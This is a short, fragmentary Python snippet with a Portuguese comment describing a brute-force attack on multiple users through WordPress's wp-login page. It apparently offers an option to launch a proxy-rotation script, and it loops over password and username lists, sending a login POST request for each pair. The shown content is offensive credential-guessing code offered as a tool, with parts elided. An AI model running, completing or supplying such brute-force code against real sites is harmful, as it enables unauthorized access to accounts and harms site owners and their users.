# Bruteforce em mais de um usuário via WP-LOGIN.
...
if (escolha == '1'):
		if(sistema == "nt"):
			os.system("proxies\wpl\proxies.py")
		else:
			os.system("python3 proxies/wpl/proxies.py")
else:
	 ...
	 for senha in senhas_lista:
	 	for usuario in usuarios_lista:
	 		...
	 		r = requests.post(url=site,data=postdata,timeout=40,cookies=wpcookies,headers=headers,allow_redirects=False)
